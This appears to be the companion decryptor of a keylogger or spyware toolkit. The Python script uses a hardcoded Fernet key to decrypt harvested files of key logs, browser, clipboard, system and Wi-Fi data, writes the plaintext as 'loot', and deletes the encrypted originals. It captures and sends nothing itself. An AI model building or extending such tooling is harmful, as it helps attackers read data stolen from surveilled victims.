# pylint: disable=W0106
""" Built-in modules """
import os
import re
import sys
from pathlib import Path
# External modules #
from cryptography.fernet import Fernet


def print_err(msg: str):
    """
    Displays the passed in error message through stderr.

    :param msg:  The error message to be displayed.
    :return:  Nothing
    """
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


def main():
    """
    Decrypts the encrypted contents in the DecryptDock Folder.

    :return:  Nothing
    """
    encrypted_files = ['e_network_info.txt', 'e_system_info.txt',
                       'e_browser_info.txt', 'e_key_logs.txt']

    # If the OS is Windows #
    if os.name == 'nt':
        re_xml = re.compile(r'.{1,255}\.xml$')

        # Add any of the xml files in the dir to the encrypted files list #
        [encrypted_files.append(file.name) for file in os.scandir(decrypt_path)
         if re_xml.match(file.name)]

        encrypted_files.append('e_clipboard_info.txt')
    else:
        encrypted_files.append('e_wifi_info.txt')

    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    # Iterate through the files to be decrypted #
    for file_decrypt in encrypted_files:
        # Set the encrypted and decrypted file paths #
        crypt_path = decrypt_path / file_decrypt
        plain_path = decrypt_path / file_decrypt[2:]
        try:
            # Read the encrypted file data #
            with crypt_path.open('rb') as in_file:
                data = in_file.read()

            # Decrypt the encrypted file data #
            decrypted = Fernet(key).decrypt(data)

            # Write the decrypted data to fresh file #
            with plain_path.open('wb') as loot:
                loot.write(decrypted)

            # Remove original encrypted files #
            crypt_path.unlink()

        # If file IO error occurs #
        except OSError as io_err:
            print_err(f'Error occurred during {file_decrypt} decryption: {io_err}')
            sys.exit(1)


if __name__ == '__main__':
    # Get the current working dir #
    decrypt_path = Path.cwd() / 'DecryptDock'

    # If the decryption file dock does not exist #
    if not decrypt_path.exists():
        # Create missing DecryptDock #
        decrypt_path.mkdir()
        # Print error message and exit #
        print_err('DecryptDock created due to not existing .. place encrypted components in it '
                  'and restart the program')
        sys.exit(1)

    try:
        main()

    except KeyboardInterrupt:
        print('* Ctrl + C detected...program exiting *')

    sys.exit(0)
